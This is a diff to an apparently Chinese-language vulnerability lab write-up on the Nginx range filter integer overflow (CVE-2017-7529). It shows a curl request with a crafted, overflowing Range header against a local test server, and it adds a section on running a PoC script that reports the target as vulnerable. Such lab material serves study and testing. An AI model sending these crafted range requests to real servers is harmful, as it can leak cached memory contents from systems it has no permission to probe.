@@ -70,6 +70,14 @@ $ curl -i http://127.0.0.1:8000/proxy/demo.png -r -17208,-9223372036854758600
 
 ![](./poc.png)
 
+#### PoC 脚本
+
+```
+$ python poc.py http://127.0.0.1:8000/proxy/demo.png
+
+Vulnerable: http://127.0.0.1:8000/proxy/demo.png
+```
+
 ### 参考链接
 
 * [【漏洞分析】Nginx range 过滤器整形溢出漏洞 (CVE–2017–7529)预警分析](http://bobao.360.cn/learning/detail/4102.html)
